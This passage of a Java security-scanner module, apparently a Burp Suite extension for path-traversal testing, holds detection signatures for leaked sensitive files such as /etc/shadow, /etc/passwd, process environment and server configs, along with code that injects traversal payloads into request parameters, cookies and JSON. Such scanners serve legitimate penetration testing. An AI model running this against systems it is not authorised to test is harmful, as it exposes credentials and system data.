                    targets.add(new TraversalTarget(fullKey, v, TargetType.JSON));
                }
            } else if (val.isJsonObject()) {
                extractJsonTargets(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    // ==================== DETECTION HELPERS ====================

    private ConfirmedRead detectConfirmedRead(String body, String checkType, String baselineBody) {
        // Avoid false positives: if the baseline already contains the pattern, skip
        switch (checkType) {
            case "UNIX_PASSWD": {
                Matcher m = UNIX_PASSWD_PATTERN.matcher(body);
                if (m.find() && (baselineBody == null || !UNIX_PASSWD_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("root:x:0:0 found in response");
                }
                break;
            }
            case "UNIX_HOSTNAME": {
                // REMOVED: single-word responses are too ambiguous to confirm /etc/hostname read.
                break;
            }
            case "UNIX_ENVIRON": {
                // Require at least 3 of 4 markers to confirm /proc/self/environ
                int environMarkers = 0;
                if (body.contains("PATH=")) environMarkers++;
                if (body.contains("HOME=")) environMarkers++;
                if (body.contains("USER=")) environMarkers++;
                if (body.contains("SHELL=")) environMarkers++;
                if (environMarkers >= 3 && (baselineBody == null || !UNIX_ENVIRON_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("Environment variables (" + environMarkers + "/4 markers) found");
                }
                break;
            }
            case "UNIX_CMDLINE": {
                // Require null-separated strings containing recognizable process paths
                if (body.contains("\0")) {
                    Pattern cmdlinePattern = Pattern.compile("/(?:usr|bin|sbin|opt|var|home)/");
                    if (cmdlinePattern.matcher(body).find()
                            && (baselineBody == null || !baselineBody.contains("\0"))) {
                        return new ConfirmedRead("/proc/self/cmdline: null-separated args with Unix paths");
                    }
                }
                break;
            }
            case "WIN_INI": {
                if (WIN_INI_PATTERN.matcher(body).find()
                        && (baselineBody == null || !WIN_INI_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("[fonts] or [extensions] section found (win.ini)");
                }
                break;
            }
            case "WIN_HOSTS": {
                // Require 127.0.0.1 and localhost within 20 chars of each other
                int idx127 = body.indexOf("127.0.0.1");
                if (idx127 >= 0) {
                    int searchStart = Math.max(0, idx127 - 20);
                    int searchEnd = Math.min(body.length(), idx127 + 30);
                    String vicinity = body.substring(searchStart, searchEnd);
                    if (vicinity.contains("localhost")
                            && (baselineBody == null || !baselineBody.contains("127.0.0.1"))) {
                        return new ConfirmedRead("Windows hosts file content (127.0.0.1 localhost nearby)");
                    }
                }
                break;
            }
            case "UNIX_SHADOW": {
                if (UNIX_SHADOW_PATTERN.matcher(body).find()
                        && (baselineBody == null || !UNIX_SHADOW_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/etc/shadow content: password hashes found");
                }
                break;
            }
            case "UNIX_ISSUE": {
                // REMOVED: /etc/issue content (distro names like "Ubuntu") is too generic
                // to confirm a file read. A page mentioning "Ubuntu" is not evidence.
                break;
            }
            case "UNIX_GROUP": {
                // Require exact group file format: root:x:0:
                if (body.contains("root:x:0:")
                        && (baselineBody == null || !baselineBody.contains("root:x:0:"))) {
                    return new ConfirmedRead("/etc/group content: root:x:0: found");
                }
                break;
            }
            case "UNIX_RESOLV": {
                // Require 'nameserver' followed by an IP address pattern
                Pattern resolvPattern = Pattern.compile("nameserver\\s+\\d+\\.\\d+\\.\\d+\\.\\d+");
                if (resolvPattern.matcher(body).find()
                        && (baselineBody == null || !resolvPattern.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/etc/resolv.conf content: nameserver + IP found");
                }
                break;
            }
            case "UNIX_PROCVERSION": {
                Pattern procVersionPattern = Pattern.compile("Linux version \\d+\\.\\d+");
                if (procVersionPattern.matcher(body).find()
                        && (baselineBody == null || !procVersionPattern.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/proc/version content: Linux version found");
                }
                break;
            }
            case "UNIX_PROCSTATUS": {
                if ((body.contains("Name:") && body.contains("VmSize:"))
                        && (baselineBody == null || !baselineBody.contains("VmSize:"))) {
                    return new ConfirmedRead("/proc/self/status content: process info found");
                }
                break;
            }
            case "UNIX_OSRELEASE": {
                // Require at least 3 of: NAME=, VERSION=, ID=, VERSION_ID=, PRETTY_NAME=
                int osReleaseMarkers = 0;
                if (body.contains("NAME=")) osReleaseMarkers++;
                if (body.contains("VERSION=")) osReleaseMarkers++;
                if (body.contains("ID=")) osReleaseMarkers++;
                if (body.contains("VERSION_ID=")) osReleaseMarkers++;
                if (body.contains("PRETTY_NAME=")) osReleaseMarkers++;
                if (osReleaseMarkers >= 3 && (baselineBody == null || !baselineBody.contains("PRETTY_NAME="))) {
                    return new ConfirmedRead("/etc/os-release content found (" + osReleaseMarkers + "/5 markers)");
                }
                break;
            }
            case "UNIX_CRONTAB": {
                // Require cron schedule pattern AND (SHELL= or a command path)
                Pattern cronSchedule = Pattern.compile("\\d+\\s+\\d+\\s+\\*\\s+\\*\\s+\\*|\\*/\\d+\\s+\\*\\s+\\*\\s+\\*\\s+\\*");
                boolean hasCronSchedule = cronSchedule.matcher(body).find();
                boolean hasShellOrPath = body.contains("SHELL=") || body.contains("/usr/") || body.contains("/bin/");
                if (hasCronSchedule && hasShellOrPath
                        && (baselineBody == null || !cronSchedule.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/etc/crontab content found (cron schedule + shell/path)");
                }
                break;
            }
            case "UNIX_HOSTS": {
                // Require 127.0.0.1 followed by localhost on the same line
                Pattern hostsLinePattern = Pattern.compile("127\\.0\\.0\\.1\\s+localhost");
                if (hostsLinePattern.matcher(body).find()
                        && (baselineBody == null || !hostsLinePattern.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/etc/hosts content: 127.0.0.1\\tlocalhost found");
                }
                break;
            }
            case "UNIX_PROCTCP": {
                Pattern tcpPattern = Pattern.compile("\\d+:\\s+[0-9A-F]+:[0-9A-F]+");
                if (tcpPattern.matcher(body).find()
                        && (baselineBody == null || !tcpPattern.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/proc/net/tcp content: TCP connection entries found");
                }
                break;
            }
            case "UNIX_NGINX": {
                // Require 'server {' (with brace) AND (listen OR server_name)
                if (body.contains("server {") || body.contains("server{")) {
                    if ((body.contains("listen") || body.contains("server_name"))
                            && (baselineBody == null || !baselineBody.contains("server {"))) {
                        return new ConfirmedRead("nginx.conf content: server { block with listen/server_name");
                    }
                }
                break;
            }
            case "UNIX_APACHE": {
                // Require at least 2 of: ServerRoot, DocumentRoot, ServerName, <VirtualHost, LoadModule
                int apacheMarkers = 0;
                if (body.contains("ServerRoot")) apacheMarkers++;
                if (body.contains("DocumentRoot")) apacheMarkers++;
                if (body.contains("ServerName")) apacheMarkers++;
                if (body.contains("<VirtualHost")) apacheMarkers++;
                if (body.contains("LoadModule")) apacheMarkers++;
                if (apacheMarkers >= 2 && (baselineBody == null
                        || (!baselineBody.contains("ServerRoot") && !baselineBody.contains("DocumentRoot")))) {
                    return new ConfirmedRead("apache2.conf content: " + apacheMarkers + " Apache directives found");
                }
                break;
            }
            case "WIN_BOOTINI": {
                if ((body.contains("[boot loader]") || body.contains("multi("))
                        && (baselineBody == null || !baselineBody.contains("[boot loader]"))) {
                    return new ConfirmedRead("boot.ini content found");
                }
                break;
            }
            case "WIN_SYSTEMINI": {
                if ((body.contains("[drivers]") || body.contains("[386Enh]"))
                        && (baselineBody == null || !baselineBody.contains("[drivers]"))) {
                    return new ConfirmedRead("system.ini content found");
                }
                break;
            }
            case "WIN_PHPINI": {
                if ((body.contains("[PHP]") || body.contains("extension_dir") || body.contains("display_errors"))
                        && (baselineBody == null || !baselineBody.contains("[PHP]"))) {
                    return new ConfirmedRead("php.ini content found");
                }
                break;
            }
            case "WIN_WEBCONFIG": {
                if ((body.contains("<configuration>") || body.contains("connectionString") || body.contains("appSettings"))
                        && (baselineBody == null || !baselineBody.contains("<configuration>"))) {
                    return new ConfirmedRead("web.config content found");
                }
                break;
            }
            case "WIN_NETSETUP": {
                if ((body.contains("NetpDoDomainJoin") || body.contains("NetSetup"))
                        && (baselineBody == null || !baselineBody.contains("NetSetup"))) {
                    return new ConfirmedRead("NetSetup.log content found");
                }
                break;
            }
            case "WIN_SAM": {
                // REMOVED: The check (body differs from baseline) has zero specificity.
                // Any different response would match. No structural signature exists for
                // the SAM binary format that we can reliably detect in HTTP responses.
                break;
            }
            case "UNIX_SSHD": {
                // Require 2+ of: Port, PermitRootLogin, PasswordAuthentication, AuthorizedKeysFile
                int sshdMarkers = 0;
                if (body.contains("PermitRootLogin")) sshdMarkers++;
                if (body.contains("PasswordAuthentication")) sshdMarkers++;
                if (body.contains("AuthorizedKeysFile")) sshdMarkers++;
                if (body.contains("ChallengeResponseAuthentication")) sshdMarkers++;
                if (Pattern.compile("^\\s*Port\\s+\\d+", Pattern.MULTILINE).matcher(body).find()) sshdMarkers++;
                if (sshdMarkers >= 2 && (baselineBody == null
                        || !baselineBody.contains("PermitRootLogin"))) {
                    return new ConfirmedRead("sshd_config content: " + sshdMarkers + " SSH directives found");
                }
                break;
            }
            case "UNIX_MYSQL": {
                // Require [mysqld] section header AND 1+ of: datadir, socket, port, bind-address
                if (body.contains("[mysqld]")) {
                    int mysqlMarkers = 0;
                    if (body.contains("datadir")) mysqlMarkers++;
                    if (body.contains("socket")) mysqlMarkers++;
                    if (Pattern.compile("^\\s*port\\s*=", Pattern.MULTILINE | Pattern.CASE_INSENSITIVE).matcher(body).find()) mysqlMarkers++;
                    if (body.contains("bind-address")) mysqlMarkers++;
                    if (mysqlMarkers >= 1 && (baselineBody == null || !baselineBody.contains("[mysqld]"))) {
                        return new ConfirmedRead("my.cnf content: [mysqld] + " + mysqlMarkers + " MySQL directives");
                    }
                }
                break;
            }
            case "UNIX_PGHBA": {
                // pg_hba.conf has a distinctive header: # TYPE  DATABASE  USER  ADDRESS  METHOD
                Pattern pgHbaHeader = Pattern.compile("# TYPE\\s+DATABASE\\s+USER", Pattern.CASE_INSENSITIVE);
                boolean hasHeader = pgHbaHeader.matcher(body).find();
                boolean hasAuthLine = Pattern.compile("^\\s*(?:local|host|hostssl|hostnossl)\\s+\\S+\\s+\\S+",
                        Pattern.MULTILINE).matcher(body).find();
                if (hasHeader && hasAuthLine
                        && (baselineBody == null || !pgHbaHeader.matcher(baselineBody).find())) {
                    return new ConfirmedRead("pg_hba.conf content: TYPE/DATABASE/USER header + auth rules");
                }
                break;
            }
            case "UNIX_ACCESSLOG": {
                // Apache/nginx combined log format: IP - - [date] "METHOD /path HTTP/x.x" status size
                Pattern accessLogPattern = Pattern.compile(
                        "\\d+\\.\\d+\\.\\d+\\.\\d+\\s+\\S+\\s+\\S+\\s+\\[.+?\\]\\s+\"(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\\s+");
                if (accessLogPattern.matcher(body).find()
                        && (baselineBody == null || !accessLogPattern.matcher(baselineBody).find())) {
                    return new ConfirmedRead("Access log content: Apache/nginx combined log format entries");
                }
                break;
            }
            case "UNIX_REDIS": {
                // Require 2+ of: bind, port (with number), requirepass, dir (with path), dbfilename
                int redisMarkers = 0;
                if (Pattern.compile("^\\s*bind\\s+", Pattern.MULTILINE).matcher(body).find()) redisMarkers++;
                if (Pattern.compile("^\\s*port\\s+\\d+", Pattern.MULTILINE).matcher(body).find()) redisMarkers++;
                if (body.contains("requirepass")) redisMarkers++;
                if (Pattern.compile("^\\s*dir\\s+/", Pattern.MULTILINE).matcher(body).find()) redisMarkers++;
                if (body.contains("dbfilename")) redisMarkers++;
                if (redisMarkers >= 2 && (baselineBody == null || !baselineBody.contains("dbfilename"))) {
                    return new ConfirmedRead("redis.conf content: " + redisMarkers + " Redis directives found");
                }
                break;
            }
            case "UNIX_OPENSSL": {
                // Require 2+ of: [req], [v3_ca], default_bits, distinguished_name, [CA_default]
                int opensslMarkers = 0;
                if (body.contains("[req]")) opensslMarkers++;
                if (body.contains("[v3_ca]")) opensslMarkers++;
                if (body.contains("default_bits")) opensslMarkers++;
                if (body.contains("distinguished_name")) opensslMarkers++;
                if (body.contains("[CA_default]")) opensslMarkers++;
                if (opensslMarkers >= 2 && (baselineBody == null || !baselineBody.contains("[req]"))) {
                    return new ConfirmedRead("openssl.cnf content: " + opensslMarkers + " OpenSSL sections/directives");
                }
                break;
            }
            case "WIN_LICENSE": {
                // RTF header + Microsoft/Windows keyword
                if (body.contains("{\\rtf")
                        && (body.contains("Microsoft") || body.contains("Windows") || body.contains("MICROSOFT"))
                        && (baselineBody == null || !baselineBody.contains("{\\rtf"))) {
                    return new ConfirmedRead("license.rtf content: RTF header + Microsoft reference");
                }
                break;
            }
            case "WIN_MYSQL": {
                // Require [mysqld] AND 1+ of: datadir, port, socket
                if (body.contains("[mysqld]")) {
                    boolean hasDirective = body.contains("datadir")
                            || Pattern.compile("^\\s*port\\s*=", Pattern.MULTILINE | Pattern.CASE_INSENSITIVE).matcher(body).find()
                            || body.contains("socket");
                    if (hasDirective && (baselineBody == null || !baselineBody.contains("[mysqld]"))) {
                        return new ConfirmedRead("my.ini content: [mysqld] + MySQL directive");
                    }
                }
                break;
            }
        }
        return null;
    }

    private boolean isPhpTarget(HttpRequestResponse requestResponse) {
        if (requestResponse.response() == null) return false;
        for (var h : requestResponse.response().headers()) {
            if (h.name().equalsIgnoreCase("X-Powered-By") && h.value().toLowerCase().contains("php")) {
                return true;
            }
            if (h.name().equalsIgnoreCase("Set-Cookie") && h.value().contains("PHPSESSID")) {
                return true;
            }
            if (h.name().equalsIgnoreCase("Server") && h.value().toLowerCase().contains("php")) {
                return true;
            }
        }
        // Also check request cookies
        for (var h : requestResponse.request().headers()) {
            if (h.name().equalsIgnoreCase("Cookie") && h.value().contains("PHPSESSID")) {
                return true;
            }
        }
        return false;
    }

    // ==================== PAYLOAD INJECTION ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, TraversalTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, TraversalTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, target.name, payload);
            case JSON:
                return injectJsonPayload(request, target.name, payload);
            default:
                return request;
        }
    }

    private HttpRequest injectJsonPayload(HttpRequest request, String dotKey, String payload) {
        try {
            String body = request.bodyToString();
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(body);
            if (!root.isJsonObject()) return request;

            String[] parts = dotKey.split("\\.");
            if (parts.length == 1) {
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
                return request.withBody(body.replaceFirst(pattern, replacement));
            }

            com.google.gson.JsonObject current = root.getAsJsonObject();
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return request;
                current = child.getAsJsonObject();
            }
            current.addProperty(parts[parts.length - 1], payload);
            return request.withBody(new com.google.gson.Gson().toJson(root));
        } catch (Exception e) {
            return request;
        }
    }

    // ==================== HELPERS ====================

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("traversal.perHostDelay", 300);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { }

    // Inner types
    private enum TargetType { QUERY, BODY, JSON, COOKIE }

    private static class TraversalTarget {
        final String name, originalValue;
        final TargetType type;
        TraversalTarget(String n, String v, TargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
        @Override public boolean equals(Object o) {
            if (this == o) return true;
            if (!(o instanceof TraversalTarget)) return false;
            TraversalTarget t = (TraversalTarget) o;
            return name.equals(t.name) && type == t.type;
        }
        @Override public int hashCode() { return Objects.hash(name, type); }
    }

    private static class ConfirmedRead {
        final String evidence;
        ConfirmedRead(String evidence) { this.evidence = evidence; }
    }
}
